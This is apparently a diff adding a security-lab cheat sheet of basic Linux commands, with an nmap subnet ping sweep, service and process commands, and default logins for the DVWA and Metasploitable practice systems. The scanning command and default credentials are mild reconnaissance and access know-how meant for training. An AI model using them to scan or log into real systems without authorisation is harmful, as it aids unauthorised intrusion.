+ping [ip_address]
+nmap -sn 192.168.1.0/24
+netstat -tuln
+ss -tuln
+
+Starting/Stopping Services:
+sudo service apache2 start
+sudo service apache2 stop
+sudo service apache2 restart
+sudo service mysql start
+
+File Operations:
+nano [filename]
+cat [filename]
+ls -la
+pwd
+cd [directory]
+cp [source] [destination]
+mv [source] [destination]
+rm [filename]
+
+Process Management:
+ps aux
+ps aux | grep [process_name]
+kill [PID]
+kill -9 [PID]
+top
+htop
+
+PASSWORDS AND CREDENTIALS USED IN LABS:
+
+DVWA:
+Username: admin
+Password: password
+
+Metasploitable:
+Username: msfadmin
+Password: msfadmin
+
+Test Credentials for Examples:
+Username: test
+Password: test
+
+Username: admin
+Password: admin
+
